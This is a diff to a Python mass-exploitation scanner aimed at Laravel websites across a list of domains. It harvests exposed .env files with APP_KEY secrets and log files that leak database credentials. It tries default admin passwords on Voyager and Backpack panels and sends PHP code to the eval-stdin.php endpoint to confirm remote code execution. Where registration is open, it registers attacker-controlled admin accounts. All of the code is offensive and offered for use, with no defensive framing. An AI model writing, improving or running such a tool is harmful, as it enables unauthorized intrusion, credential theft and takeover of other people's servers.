@@ -56,8 +56,8 @@ fg = Fore.GREEN
 
 files_and_words = [
     ("/packages/barryvdh/elfinder/css/elfinder.min.css", "file manager for web", 'result_elfinder.txt'),
-    ("./vendor/packages/barryvdh/elfinder/css/elfinder.min.css", "file manager for web", 'result_elfinder.txt'),
-    ("./vendor/barryvdh/laravel-elfinder/resources/assets/js/standalonepopup.js", "event.preventDefault", 'result_elfinder.txt'),
+    ("/vendor/packages/barryvdh/elfinder/css/elfinder.min.css", "file manager for web", 'result_elfinder.txt'),
+    ("/vendor/barryvdh/laravel-elfinder/resources/assets/js/standalonepopup.js", "event.preventDefault", 'result_elfinder.txt'),
     ("/core/./packages/barryvdh/elfinder/css/elfinder.min.css", "file manager for web", 'result_elfinder.txt'),
     ("/core/./vendor/barryvdh/laravel-elfinder/resources/assets/js/standalonepopup.js", "event.preventDefault", 'result_elfinder.txt'),
     ("/backend/./packages/barryvdh/elfinder/css/elfinder.min.css", "file manager for web", 'result_elfinder.txt'),
@@ -84,31 +84,34 @@ files_and_words = [
     ("/new/./vendor/barryvdh/laravel-elfinder/resources/assets/js/standalonepopup.js", "event.preventDefault", 'result_elfinder.txt'),
     ("/docker/./packages/barryvdh/elfinder/css/elfinder.min.css", "file manager for web", 'result_elfinder.txt'),
     ("/docker/./vendor/barryvdh/laravel-elfinder/resources/assets/js/standalonepopup.js", "event.preventDefault", 'result_elfinder.txt'),
-    ("/./.env", "APP_KEY:", 'result_env.txt'),
-    ("/core/./.env", "APP_KEY:", 'result_env.txt'),
-    ("/backend/./.env", "APP_KEY:", 'result_env.txt'),
-    ("/app/./.env", "APP_KEY:", 'result_env.txt'),
-    ("/laravel/./.env", "APP_KEY:", 'result_env.txt'),
-    ("/laravel/core/./.env", "APP_KEY:", 'result_env.txt'),
-    ("/beta/./.env", "APP_KEY:", 'result_env.txt'),
-    ("/config/./.env", "APP_KEY:", 'result_env.txt'),
-    ("/kyc/./.env", "APP_KEY:", 'result_env.txt'),
-    ("/admin/./.env", "APP_KEY:", 'result_env.txt'),
-    ("/prod/./.env", "APP_KEY:", 'result_env.txt'),
-    ("/api/./.env", "APP_KEY:", 'result_env.txt'),
-    ("/assets/./.env", "APP_KEY:", 'result_env.txt'),
-    ("/new/./.env", "APP_KEY:", 'result_env.txt'),
+    ("/./.env", "APP_KEY=", 'result_env.txt'),
+    ("/core/./.env", "APP_KEY=", 'result_env.txt'),
+    ("/backend/./.env", "APP_KEY=", 'result_env.txt'),
+    ("/app/./.env", "APP_KEY=", 'result_env.txt'),
+    ("/laravel/./.env", "APP_KEY=", 'result_env.txt'),
+    ("/laravel/core/./.env", "APP_KEY=", 'result_env.txt'),
+    ("/beta/./.env", "APP_KEY=", 'result_env.txt'),
+    ("/config/./.env", "APP_KEY=", 'result_env.txt'),
+    ("/kyc/./.env", "APP_KEY=", 'result_env.txt'),
+    ("/admin/./.env", "APP_KEY=", 'result_env.txt'),
+    ("/prod/./.env", "APP_KEY=", 'result_env.txt'),
+    ("/api/./.env", "APP_KEY=", 'result_env.txt'),
+    ("/assets/./.env", "APP_KEY=", 'result_env.txt'),
+    ("/new/./.env", "APP_KEY=", 'result_env.txt'),
     ("/admin/voyager-assets", "vendor/tcg/voyager", 'result_voyager.txt'),
     ("/storage/logs/laravel.log", "PDO->__construct('mysql:host=", 'result_laravel_logs.txt'),
     ("/register", None, 'result_register.txt'),
     ("/admin/register", None, 'result_register.txt'),
     ("/filemanager", None, 'result_filemanager.txt'),
-    ("/laravel-filemanager", None, 'result_filemanager.txt')
+    ("/laravel-filemanager", None, 'result_filemanager.txt'),
+    ("/client/manifest.json", None, 'result_vebto.txt')
 ]
 
-def save_result(file, url):
-    with open(file, 'a') as f:
-        f.write(url + "\n")
+def save_result(file, url, results_set):
+    if url not in results_set:
+        with open(file, 'a') as f:
+            f.write(url + "\n")
+        results_set.add(url)
 
 def decompress_response(response):
     encoding = response.headers.get('Content-Encoding', '')
@@ -122,31 +125,48 @@ def decompress_response(response):
         return response.text
 
 def checkenv(site):
+    results_set = set()
     for path, word, result_file in files_and_words:
-        try:
-            for protocol in ["http", "https"]:
-                url = f"{protocol}://{site}{path}"
+        found = False
+        for protocol in ["http", "https"]:
+            if found:
+                break
+            url = f"{protocol}://{site}{path}"
+            try:
                 request = requests.get(url, headers=headers, verify=False, timeout=10)
                 if word:
                     if word in request.text:
-                        save_result(result_file, url)
+                        save_result(result_file, url, results_set)
+                        found = True
                 else:
                     if path.endswith("/register") or path.endswith("/admin/register"):
                         if request.status_code == 404:
                             continue
                         elif "login" in request.url or request.status_code in [301, 302, 303, 307, 308]:
-                            save_result(result_file, url)
+                            save_result(result_file, url, results_set)
+                            found = True
                         elif "<form" in request.text:
-                            save_result(result_file, url)
+                            save_result(result_file, url, results_set)
+                            found = True
                     elif "login" in request.url:
-                        save_result('result_filemanager.txt', url)
+                        save_result('result_filemanager.txt', url, results_set)
+                        found = True
                     elif "filemanager/upload\" role='form' id='uploadForm' name='uploadForm'" in request.text:
-                        save_result('result_filemanager.txt', url)
-                
-                # Additional validation for standalonepopup.js
-                if path.endswith("standalonepopup.js") and request.status_code == 200 and 'content-type' in request.headers:
-                    if "application/javascript" in request.headers['content-type']:
-                        save_result(result_file, url)
+                        save_result('result_filemanager.txt', url, results_set)
+                        found = True
+                    
+                    # Additional validation for standalonepopup.js
+                    if path.endswith("standalonepopup.js") and request.status_code == 200 and 'content-type' in request.headers:
+                        if "application/javascript" in request.headers['content-type']:
+                            if "event.preventDefault" in request.text:
+                                save_result(result_file, url, results_set)
+                                found = True
+
+                    # Check for manifest.json
+                    if path == "/client/manifest.json" and request.status_code == 200:
+                        if '"display": "standalone"' in request.text or '"src": "favicon/icon-72x72.png"' in request.text:
+                            save_result(result_file, url, results_set)
+                            found = True
 
                 if path == "/admin/login":
                     ses = requests.Session()
@@ -162,92 +182,105 @@ def checkenv(site):
                             }
                             try_login = ses.post(url, verify=False, timeout=10, data=data, allow_redirects=True)
                             if any(keyword in try_login.text for keyword in ['admin/profile', 'voyager-person', 'admin/logout', 'voyager-power', 'dashboard', 'voyager::']):
-                                save_result('result_voyager.txt', url)
-        except Exception as e:
-            print(f"{fr}# {fw}" + site + f"{fw} | {fr}BOSOK")
-            # Tidak menulis kesalahan ke file hasil jika tidak ditemukan atau terjadi kesalahan
+                                save_result('result_voyager.txt', url, results_set)
+                                found = True
+            except Exception as e:
+                print(f"{fr}# {fw}" + site + f"{fw} | {fr}BOSOK")
+                # Tidak menulis kesalahan ke file hasil jika tidak ditemukan atau terjadi kesalahan
 
 def check_eval_stdin(site):
+    results_set = set()
+    found = False
     for path in paths:
-        full_url = f"http://{site}{path}"
-        print(f"Checking URL: {full_url}")
-        try:
-            response = requests.get(full_url, headers=headers, timeout=timeout)
-            if response.status_code == 200:
-                print(f"Found {full_url}, attempting to execute PHP code...")
-                response_exec = requests.post(full_url, headers=headers, data=php_code, timeout=timeout)
-                print(f"Response status code: {response_exec.status_code}")
-                print(f"Response headers: {response_exec.headers}")
+        if found:
+            break
+        for protocol in ["http", "https"]:
+            full_url = f"{protocol}://{site}{path}"
+            print(f"Checking URL: {full_url}")
+            try:
+                response = requests.get(full_url, headers=headers, timeout=10)
+                if response.status_code == 200:
+                    print(f"Found {full_url}, attempting to execute PHP code...")
+                    response_exec = requests.post(full_url, headers=headers, data=php_code, timeout=10)
+                    print(f"Response status code: {response_exec.status_code}")
+                    print(f"Response headers: {response_exec.headers}")
 
-                try:
-                    response_text = decompress_response(response_exec)
-                except Exception as e:
-                    print(f"Error decompressing response from {full_url}: {e}")
-                    response_text = response_exec.text
+                    try:
+                        response_text = decompress_response(response_exec)
+                    except Exception as e:
+                        print(f"Error decompressing response from {full_url}: {e}")
+                        response_text = response_exec.text
 
-                print(f"Response text (first 500 chars): {response_text[:500]}")
+                    print(f"Response text (first 500 chars): {response_text[:500]}")
 
-                if response_exec.status_code == 200 and "<!DOCTYPE html" in response_text and "phpinfo()" in response_text:
-                    result = f"{full_url} - eval-stdin.php ditemukan dan bisa dieksekusi."
-                    with open("result_new.txt", "a", encoding='utf-8') as result_file:
-                        result_file.write(result + "\n")
-                    print(result)
-                    return result
+                    if response_exec.status_code == 200 and "<!DOCTYPE html" in response_text and "phpinfo()" in response_text:
+                        result = f"{full_url} - eval-stdin.php ditemukan dan bisa dieksekusi."
+                        save_result("result_new.txt", full_url, results_set)
+                        print(result)
+                        found = True
+                    else:
+                        result = f"{full_url} - eval-stdin.php ditemukan tapi tidak bisa dieksekusi."
+                        print(result)
+                        found = True
                 else:
-                    result = f"{full_url} - eval-stdin.php ditemukan tapi tidak bisa dieksekusi."
+                    result = f"{full_url} - eval-stdin.php tidak ditemukan."
                     print(result)
-                    return result
-            else:
-                result = f"{full_url} - eval-stdin.php tidak ditemukan."
-                print(result)
-                return result
-        except requests.RequestException as e:
-            print(f"{full_url} - Error: {str(e)}")
-            continue
+                    found = True
+            except requests.RequestException as e:
+                print(f"{full_url} - Error: {str(e)}")
+                continue
     return f"{site} - eval-stdin.php tidak ditemukan di semua jalur."
 
 def test_backpack(site):
-    try:
-        url = f"https://{site}/admin/login"
-        ses = requests.Session()
-        getCsrf = ses.get(url)
-        if getCsrf.status_code == 200:
-            csrf = re.findall(r'"_token" value="(.*?)"', getCsrf.text)
-            if len(csrf) == 1:
-                login_data = {
-                    "_token": csrf[0],
-                    "email": "admin@example.com",
-                    "password": "admin"
-                }
-                try_login = ses.post(url, verify=False, timeout=10, data=login_data, allow_redirects=True)
-                if "dashboard" in try_login.text or "admin" in try_login.text:
-                    elfinder_url = f"https://{site}/admin/elfinder"
-                    elfinder_check = ses.get(elfinder_url, headers=headers, verify=False, timeout=10)
-                    if "elfinder.min.css" in elfinder_check.text:
-                        save_result('backpack.txt', elfinder_url)
-            else:
-                register_url = f"https://{site}/admin/register"
-                get_register = ses.get(register_url)
-                if "Registration is closed" not in get_register.text:
-                    csrf = re.findall(r'"_token" value="(.*?)"', get_register.text)
-                    if len(csrf) == 1:
-                        register_data = {
-                            "_token": csrf[0],
-                            "name": "yucaerin",
-                            "email": "yucaerin@hotmail.com",
-                            "password": "123123123",
-                            "password_confirmation": "123123123",
-                            "role": "admin",
-                            "role_id": "1"
-                        }
-                        try_register = ses.post(register_url, verify=False, timeout=10, data=register_data, allow_redirects=True)
-                        if "dashboard" in try_register.text or "admin" in try_register.text:
-                            elfinder_url = f"https://{site}/admin/elfinder"
-                            elfinder_check = ses.get(elfinder_url, headers=headers, verify=False, timeout=10)
-                            if "elfinder.min.css" in elfinder_check.text:
-                                save_result('backpack.txt', elfinder_url)
-    except Exception as e:
-        print(f"{fr}# {fw}" + site + f"{fw} | {fr}BOSOK")
+    results_set = set()
+    found = False
+    for protocol in ["http", "https"]:
+        if found:
+            break
+        base_url = f"{protocol}://{site}"
+        try:
+            url = f"{base_url}/admin/login"
+            ses = requests.Session()
+            getCsrf = ses.get(url)
+            if getCsrf.status_code == 200:
+                csrf = re.findall(r'"_token" value="(.*?)"', getCsrf.text)
+                if len(csrf) == 1:
+                    login_data = {
+                        "_token": csrf[0],
+                        "email": "admin@example.com",
+                        "password": "admin"
+                    }
+                    try_login = ses.post(url, verify=False, timeout=10, data=login_data, allow_redirects=True)
+                    if "dashboard" in try_login.text or "admin" in try_login.text:
+                        elfinder_url = f"{base_url}/admin/elfinder"
+                        elfinder_check = ses.get(elfinder_url, headers=headers, verify=False, timeout=10)
+                        if "elfinder.min.css" in elfinder_check.text:
+                            save_result('backpack.txt', elfinder_url, results_set)
+                        found = True
+                else:
+                    register_url = f"{base_url}/admin/register"
+                    get_register = ses.get(register_url)
+                    if "Registration is closed" not in get_register.text:
+                        csrf = re.findall(r'"_token" value="(.*?)"', get_register.text)
+                        if len(csrf) == 1:
+                            register_data = {
+                                "_token": csrf[0],
+                                "name": "yucaerin",
+                                "email": "yucaerin@hotmail.com",
+                                "password": "123123123",
+                                "password_confirmation": "123123123",
+                                "role": "admin",
+                                "role_id": "1"
+                            }
+                            try_register = ses.post(register_url, verify=False, timeout=10, data=register_data, allow_redirects=True)
+                            if "dashboard" in try_register.text or "admin" in try_register.text:
+                                elfinder_url = f"{base_url}/admin/elfinder"
+                                elfinder_check = ses.get(elfinder_url, headers=headers, verify=False, timeout=10)
+                                if "elfinder.min.css" in elfinder_check.text:
+                                    save_result('backpack.txt', elfinder_url, results_set)
+                                found = True
+        except Exception as e:
+            print(f"{fr}# {fw}" + site + f"{fw} | {fr}BOSOK")
 
 def main(file_path):
     domains = read_urls(file_path)
